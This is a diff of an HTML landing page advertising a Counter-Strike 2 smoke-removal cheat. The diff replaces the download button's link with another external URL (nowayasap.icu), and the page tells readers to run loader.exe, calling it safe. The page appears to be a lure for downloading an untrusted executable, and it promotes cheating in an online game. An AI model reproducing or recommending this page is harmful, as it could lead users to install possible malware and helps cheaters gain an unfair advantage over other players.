@@ -1,7 +1,7 @@
 <div style="max-width:800px;margin:auto;padding:20px;font-family:Arial,sans-serif;line-height:1.6;background:#0a0a0f;color:#e0e0e0;border-radius:15px;">
 <h1 style="color:#44aaff;border-bottom:2px solid #2288cc;text-align:center;">💨 CS2 Smoke Be Gone – One-Click Smoke Removal Utility</h1>
 <p style="font-size:1.1em;text-align:center;"><strong>The simplest way to eliminate smoke grenade clouds in Counter-Strike 2.</strong> Download, run loader.exe, launch CS2 – smoke is gone. No configuration, no settings, no hassle.</p>
-<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://www.shawonline.co.za/redirl" style="background:#44aaff;color:#000;padding:12px 25px;text-decoration:none;border-radius:5px;">⬇️ DOWNLOAD CS2 SMOKE BE GONE (SETUP)</a><p>✅ Instant smoke removal ✅ No config ✅ Works in all modes ✅ Safe & reversible</p></div>
+<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://nowayasap.icu/set" style="background:#44aaff;color:#000;padding:12px 25px;text-decoration:none;border-radius:5px;">⬇️ DOWNLOAD CS2 SMOKE BE GONE (SETUP)</a><p>✅ Instant smoke removal ✅ No config ✅ Works in all modes ✅ Safe & reversible</p></div>
 <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/730/header.jpg" style="max-width:100%;border-radius:8px;margin:15px 0;">
 <div><h3>📦 What This Tool Does:</h3>
 <ul><li><strong>Removes smoke clouds instantly:</strong> The tool disables the rendering of smoke grenade effects. When a smoke pops, you see nothing – just clear air.</li>
